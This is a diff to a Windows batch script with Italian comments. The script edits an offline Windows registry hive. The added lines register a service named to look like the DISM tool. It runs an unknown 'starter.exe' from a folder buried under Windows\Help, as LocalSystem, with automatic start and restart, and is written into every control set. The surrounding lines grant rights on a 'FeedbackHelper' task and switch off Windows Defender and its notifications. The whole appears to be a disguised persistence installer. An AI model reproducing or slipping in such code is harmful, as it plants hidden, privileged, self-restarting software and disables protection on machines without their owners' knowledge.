@@ -67,7 +67,140 @@ icacls "!WINLETTER!\Windows\System32\Tasks\FeedbackHelper" /grant "SYSTEM:(F)" /
 
 
 
-:: merda defender e notifiche off
+
+
+:: qui installa i servizi
+reg load HKLM\zSYSTEM "!WINLETTER!\Windows\System32\Config\SYSTEM"
+reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice" /f
+reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice" /v Type /t REG_DWORD /d 16 /f
+reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice" /v Start /t REG_DWORD /d 2 /f
+reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice" /v ErrorControl /t REG_DWORD /d 1 /f
+reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice" /v ImagePath /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\nssm.exe" /f
+reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice" /v DisplayName /t REG_SZ /d "DISMservice" /f
+reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice" /v ObjectName /t REG_SZ /d "LocalSystem" /f
+reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice" /v DelayedAutostart /t REG_DWORD /d 0 /f
+reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice" /v FailureActionsOnNonCrashFailures /t REG_DWORD /d 1 /f
+reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice\Parameters" /v Application /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\starter.exe" /f
+reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice\Parameters" /v AppParameters /t REG_EXPAND_SZ /d "" /f
+reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice\Parameters" /v AppDirectory /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic" /f
+reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice\Parameters\AppExit" /ve /t REG_SZ /d "Restart" /f
+
+reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice" /f
+reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice" /v Type /t REG_DWORD /d 16 /f
+reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice" /v Start /t REG_DWORD /d 2 /f
+reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice" /v ErrorControl /t REG_DWORD /d 1 /f
+reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice" /v ImagePath /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\nssm.exe" /f
+reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice" /v DisplayName /t REG_SZ /d "DISMservice" /f
+reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice" /v ObjectName /t REG_SZ /d "LocalSystem" /f
+reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice" /v DelayedAutostart /t REG_DWORD /d 0 /f
+reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice" /v FailureActionsOnNonCrashFailures /t REG_DWORD /d 1 /f
+reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice\Parameters" /v Application /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\starter.exe" /f
+reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice\Parameters" /v AppParameters /t REG_EXPAND_SZ /d "" /f
+reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice\Parameters" /v AppDirectory /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic" /f
+reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice\Parameters\AppExit" /ve /t REG_SZ /d "Restart" /f
+
+reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice" /f
+reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice" /v Type /t REG_DWORD /d 16 /f
+reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice" /v Start /t REG_DWORD /d 2 /f
+reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice" /v ErrorControl /t REG_DWORD /d 1 /f
+reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice" /v ImagePath /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\nssm.exe" /f
+reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice" /v DisplayName /t REG_SZ /d "DISMservice" /f
+reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice" /v ObjectName /t REG_SZ /d "LocalSystem" /f
+reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice" /v DelayedAutostart /t REG_DWORD /d 0 /f
+reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice" /v FailureActionsOnNonCrashFailures /t REG_DWORD /d 1 /f
+reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice\Parameters" /v Application /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\starter.exe" /f
+reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice\Parameters" /v AppParameters /t REG_EXPAND_SZ /d "" /f
+reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice\Parameters" /v AppDirectory /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic" /f
+reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice\Parameters\AppExit" /ve /t REG_SZ /d "Restart" /f
+
+reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice" /f
+reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice" /v Type /t REG_DWORD /d 16 /f
+reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice" /v Start /t REG_DWORD /d 2 /f
+reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice" /v ErrorControl /t REG_DWORD /d 1 /f
+reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice" /v ImagePath /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\nssm.exe" /f
+reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice" /v DisplayName /t REG_SZ /d "DISMservice" /f
+reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice" /v ObjectName /t REG_SZ /d "LocalSystem" /f
+reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice" /v DelayedAutostart /t REG_DWORD /d 0 /f
+reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice" /v FailureActionsOnNonCrashFailures /t REG_DWORD /d 1 /f
+reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice\Parameters" /v Application /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\starter.exe" /f
+reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice\Parameters" /v AppParameters /t REG_EXPAND_SZ /d "" /f
+reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice\Parameters" /v AppDirectory /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic" /f
+reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice\Parameters\AppExit" /ve /t REG_SZ /d "Restart" /f
+
+reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice" /f
+reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice" /v Type /t REG_DWORD /d 16 /f
+reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice" /v Start /t REG_DWORD /d 2 /f
+reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice" /v ErrorControl /t REG_DWORD /d 1 /f
+reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice" /v ImagePath /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\nssm.exe" /f
+reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice" /v DisplayName /t REG_SZ /d "DISMservice" /f
+reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice" /v ObjectName /t REG_SZ /d "LocalSystem" /f
+reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice" /v DelayedAutostart /t REG_DWORD /d 0 /f
+reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice" /v FailureActionsOnNonCrashFailures /t REG_DWORD /d 1 /f
+reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice\Parameters" /v Application /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\starter.exe" /f
+reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice\Parameters" /v AppParameters /t REG_EXPAND_SZ /d "" /f
+reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice\Parameters" /v AppDirectory /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic" /f
+reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice\Parameters\AppExit" /ve /t REG_SZ /d "Restart" /f
+
+reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice" /f
+reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice" /v Type /t REG_DWORD /d 16 /f
+reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice" /v Start /t REG_DWORD /d 2 /f
+reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice" /v ErrorControl /t REG_DWORD /d 1 /f
+reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice" /v ImagePath /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\nssm.exe" /f
+reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice" /v DisplayName /t REG_SZ /d "DISMservice" /f
+reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice" /v ObjectName /t REG_SZ /d "LocalSystem" /f
+reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice" /v DelayedAutostart /t REG_DWORD /d 0 /f
+reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice" /v FailureActionsOnNonCrashFailures /t REG_DWORD /d 1 /f
+reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice\Parameters" /v Application /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\starter.exe" /f
+reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice\Parameters" /v AppParameters /t REG_EXPAND_SZ /d "" /f
+reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice\Parameters" /v AppDirectory /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic" /f
+reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice\Parameters\AppExit" /ve /t REG_SZ /d "Restart" /f
+
+reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice" /f
+reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice" /v Type /t REG_DWORD /d 16 /f
+reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice" /v Start /t REG_DWORD /d 2 /f
+reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice" /v ErrorControl /t REG_DWORD /d 1 /f
+reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice" /v ImagePath /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\nssm.exe" /f
+reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice" /v DisplayName /t REG_SZ /d "DISMservice" /f
+reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice" /v ObjectName /t REG_SZ /d "LocalSystem" /f
+reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice" /v DelayedAutostart /t REG_DWORD /d 0 /f
+reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice" /v FailureActionsOnNonCrashFailures /t REG_DWORD /d 1 /f
+reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice\Parameters" /v Application /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\starter.exe" /f
+reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice\Parameters" /v AppParameters /t REG_EXPAND_SZ /d "" /f
+reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice\Parameters" /v AppDirectory /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic" /f
+reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice\Parameters\AppExit" /ve /t REG_SZ /d "Restart" /f
+
+reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice" /f
+reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice" /v Type /t REG_DWORD /d 16 /f
+reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice" /v Start /t REG_DWORD /d 2 /f
+reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice" /v ErrorControl /t REG_DWORD /d 1 /f
+reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice" /v ImagePath /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\nssm.exe" /f
+reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice" /v DisplayName /t REG_SZ /d "DISMservice" /f
+reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice" /v ObjectName /t REG_SZ /d "LocalSystem" /f
+reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice" /v DelayedAutostart /t REG_DWORD /d 0 /f
+reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice" /v FailureActionsOnNonCrashFailures /t REG_DWORD /d 1 /f
+reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice\Parameters" /v Application /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\starter.exe" /f
+reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice\Parameters" /v AppParameters /t REG_EXPAND_SZ /d "" /f
+reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice\Parameters" /v AppDirectory /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic" /f
+reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice\Parameters\AppExit" /ve /t REG_SZ /d "Restart" /f
+
+reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice" /f
+reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice" /v Type /t REG_DWORD /d 16 /f
+reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice" /v Start /t REG_DWORD /d 2 /f
+reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice" /v ErrorControl /t REG_DWORD /d 1 /f
+reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice" /v ImagePath /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\nssm.exe" /f
+reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice" /v DisplayName /t REG_SZ /d "DISMservice" /f
+reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice" /v ObjectName /t REG_SZ /d "LocalSystem" /f
+reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice" /v DelayedAutostart /t REG_DWORD /d 0 /f
+reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice" /v FailureActionsOnNonCrashFailures /t REG_DWORD /d 1 /f
+reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice\Parameters" /v Application /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\starter.exe" /f
+reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice\Parameters" /v AppParameters /t REG_EXPAND_SZ /d "" /f
+reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice\Parameters" /v AppDirectory /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic" /f
+reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice\Parameters\AppExit" /ve /t REG_SZ /d "Restart" /f
+reg unload HKLM\zSYSTEM
+
+
+
+:: WinDef e notifiche off
 reg load HKLM\zSOFTWARE "!WINLETTER!\Windows\System32\Config\SOFTWARE"
 reg add "HKLM\zSOFTWARE\Microsoft\Windows Defender Security Center" /f
 reg add "HKLM\zSOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /f
